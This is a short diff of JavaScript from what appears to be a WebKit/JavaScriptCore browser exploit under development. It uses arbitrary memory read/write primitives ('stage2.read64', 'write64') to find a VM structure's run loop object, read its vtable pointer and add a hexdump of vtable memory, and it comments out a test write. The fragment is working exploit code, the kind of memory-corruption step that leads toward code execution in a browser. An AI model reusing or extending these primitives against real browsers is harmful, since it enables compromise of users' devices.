@@ -637,10 +637,12 @@ for (var i = 0; i < 1000; ++i) {
         var m_runloop = stage2.read64(vmstruct+0x10); 
         //Ref <WTF::RunLoop> m_runLoop; at offset 0x10-0x18 proceeded by m_random
         print("m_runloop @ " + hex1(m_runloop));
-	stage2.write64(m_runloop,0x5151515151);
+	//stage2.write64(m_runloop,0x5151515151);
         //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
         var vtable = stage2.read64(m_runloop);
         print("vtable @ " + hex1(vtable));
+	var vtabledump = stage2.read(vtable,0x60);
+	print("dump" + hexdump(vtabledump));
 	//stage2.write64(hex1(vtable),0x7777);
 	//gc();
         //stage.passGC();
